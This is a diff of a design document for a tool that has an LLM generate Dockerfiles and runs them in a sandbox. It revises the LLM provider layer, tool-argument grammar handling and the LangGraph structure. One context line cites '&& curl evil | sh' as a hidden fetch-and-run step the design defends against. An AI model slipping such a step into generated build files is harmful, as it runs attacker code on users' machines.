@@ -39,22 +39,26 @@ The verdict is produced after the sandboxed run, from observed behaviour. The mo
 opinion is one input, labelled advisory, never the gate.
 
 ## The LLM layer
-One file, `envforge/llm.py`, roughly 100 to 140 lines: an `LLM` Protocol, `AnthropicLLM`
-on the native SDK using strict tool use, `OpenAICompatLLM` on the openai SDK covering
-both OpenAI and Groq through `base_url`, and `make_llm("provider:model")` validating the
-spec at startup. No LiteLLM, no LangChain model classes, and not one OpenAI client for
-all three: Anthropic's compatibility layer ignores `strict`, so the only grammar
-guarantee for Claude is on the native API, and Anthropic's own docs call that layer
-non-production.
+One file, `envforge/llm.py`, about 200 lines. `make_llm("provider:model")` returns a
+LangChain chat model: `ChatAnthropic` for Anthropic, `ChatOpenAI` for OpenAI and for Groq
+through its own `base_url`. The graph binds tools to it in one place. Nothing here builds
+a request or parses a response; that layer was hand-written until 2026-09-03 and ADR-006
+records both the original reasoning and the reversal.
 
-Anthropic and OpenAI give grammar-constrained arguments. Groq accepts the forced named
-call but its schema guarantee is documented as incompatible with tool use, so Groq is
-forced-call-plus-validation, and a validation failure there is one more repairable
-failure rather than a crash. Every provider validates the returned arguments anyway.
+What stays ours is what the framework does not do: which environment variable a provider
+reads, whether it promises a grammar for tool arguments, and the classification of an
+HTTP status into an empty account, a dead key, a rate limit or our own malformed request.
 
-The result carries the parsed arguments, the model taken from the response rather than
-the request, token counts, and the raw request and response JSON for the trace module.
-Nothing in the middle hides usage or cost.
+Anthropic and OpenAI give grammar-constrained arguments and are asked for them. Groq
+accepts the forced call but its schema guarantee is documented as incompatible with tool
+use, so Groq is forced-call-plus-validation and is never described as having a grammar.
+A submitted Dockerfile is validated locally on every provider, because that is the only
+check Groq has.
+
+Token counts come off the reply's `usage_metadata`, which is the same shape on every
+provider. Raw request and response bodies are not preserved anywhere: they used to ride
+the event stream for a trace module that was never built, and ADR-013 records why losing
+them is acceptable and where a trace would read a conversation from instead.
 
 ## How the Dockerfile is produced
 A forced strict tool call with a single `dockerfile` string field, plus `base_image`
@@ -72,10 +76,12 @@ into a different Dockerfile, which no grammar constraint can catch. And a contin
 starts mid-instruction, which is exactly where `&& curl evil | sh` hides.
 
 ## Shape
-Plain loop first, LangGraph port immediately after, both engines behind one interface.
-Everything after that is built as graph nodes. Seams kept deliberately: a `Sandbox`
-protocol, the agent yields events rather than printing, prompts live as files
-parameterised by language.
+One engine, a LangGraph `StateGraph` in `envforge/graph.py`. The plain loop it replaced
+is deleted; anything new is a node. The model's tools only read the script, and
+submitting a Dockerfile is a tool the graph routes on rather than executes, so the gate,
+the build and the run are nodes no tool call can reach. Seams kept deliberately: a
+`Sandbox` protocol, the agent yields events rather than printing, and everything a run
+needs that cannot be serialised is runtime context rather than graph state.
 
 ## Exit codes the sandbox must distinguish
 137 is a kernel kill, so the script misbehaved. 1 is the script raising on its own.
